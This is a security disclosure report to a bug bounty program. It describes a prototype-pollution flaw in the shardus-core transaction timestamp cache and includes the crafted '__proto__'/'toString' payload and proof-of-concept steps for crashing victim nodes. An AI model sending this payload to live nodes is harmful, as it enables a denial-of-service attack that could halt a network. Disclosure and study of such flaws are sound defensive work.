# Killing nodes by polluting tx timestamp cache object prototype

Submitted on Aug 10th 2024 at 01:29:47 UTC by @ZhouWu for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #34353

Report type: Blockchain/DLT

Report severity: Critical

Target: https://github.com/shardeum/shardus-core/tree/dev

Impacts:
- Network not being able to confirm new transactions (total network shutdown)

## Description

## Description
In the @shardus/core source code repo, node store a cache of transaction timestamp. Other node will ask the cache, if it's a miss the node will create new transaction timestamp cache object derived from payload of the request.
This mean that malicious party can launch a modified node, send the polluted payload to victim node via `get_tx_timestamp` cache ask endpoint. Subsequently killing the victim node.

## Vulnerability
This happen due to the cache holder node will create a transaction timestamp object if the timestamp for given transaction not found in its own cache. The problem lies within the way the cache is created.

```
this.txTimestampCache[signedTsReceipt.cycleCounter][txId] = signedTsReceipt
```
This way of referencing the cache object to assign a value is dangerous, because the referenced element come straight from the request payload. With that in mind consider the following payload
```
{
  cycleMarker: "__proto__",
  cycleCounter: "__proto__",
  txId: "toString"
}
```

This mean that the cache object will be created in the following way
```
this.txTimestampCache["__proto__"]["toString"] = signedTsReceipt
```
Essentially overwriting the prototype of the cache object, and the `toString` method of the cache object. This is problematic because `toString` is polluted to be a literal string which in turns break the code of the victim when stringify operations are done later down the stream.







## Proof of Concept
- Launch a network of legit nodes.
- Launch an attacker node with this patch applied to shardus/core
- Wait for the attacker node to go active

 ```
 - Send a request to the attacker node with the victim node public key as a query parameter
 - `GET http://localhost:1337/launch-attk?victim=<publickey>`
 - observe the logs, the node exit unCleanly, essentially killing the node.

 ## Impact
 This is pretty straight forward single node attack, the script can be modified to attack the whole network to kill the whole network.
